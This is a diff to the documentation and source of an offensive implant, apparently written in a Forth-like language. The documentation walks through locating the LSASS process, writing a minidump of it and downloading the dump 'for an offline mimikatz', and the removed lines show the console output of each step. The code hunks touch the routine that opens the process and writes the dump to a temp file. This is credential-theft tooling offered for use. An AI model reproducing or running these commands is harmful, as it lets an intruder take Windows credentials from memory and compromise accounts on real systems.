@@ -15,25 +15,9 @@
  Don't forget you can find your process with psfind.  E.g., say you want
  to download a minidump of LSASS for an offline mimikatz:
 
-     1  [sunglow]  -> psfind lsass
-     1  [sunglow]  -> 
-     ---- BEGIN OUTPUT ----
-     PID: 644     Threads: 10      PPID: 496     Image: lsass.exe
-     ----- END OUTPUT -----
-     1  [sunglow]  -> 644 minidump
-     1  [sunglow]  -> 
-     ---- BEGIN OUTPUT ----
-     [+] Opening the process
-     [+] Creating a temp file
-     [+] Writing to .\md_B587.tmp
-     [+] Triggering the dump.
-     [+] Done, minidump successful.
-     [+] Cleaning up handles.
-     ----- END OUTPUT -----
-     1  [sunglow]  -> download md_B587.tmp
-     1  [sunglow]  -> 
-     ---- BEGIN OUTPUT ----
-     Downloading file 'md_B587.tmp' of 46946372 bytes
+     psfind lsass
+     <PID> minidump
+     download <FILE>
 
  This command will write the file out to a temporary filename in the current
  directory (think about where you are first -- you might not want to write
@@ -108,7 +92,7 @@ create filename MAX_PATH allot
 
   try
     \ first, open a handle to the process with the right permissions
-    ." [+] Opening the process\n"
+    -bold ." [+] Opening the process\n"
     '{ dpid get-proc }' '{ phandle CloseHandle drop }' attempt phandle +assert
     
     \ now, open a temporary file to write the dump to
@@ -116,7 +100,7 @@ create filename MAX_PATH allot
     '{ temp-file }' '{ fhandle CloseHandle drop }' attempt fhandle +assert
     
     \ user needs to know where it is!
-    ." [+] Writing to " filename .cstring cr
+    ." [+] Writing to " filename +bold .cstring -bold cr
 
     \ trigger the dump
     ." [+] Triggering the dump.\n"
@@ -134,3 +118,4 @@ create filename MAX_PATH allot
   done
   .post
 ;
+
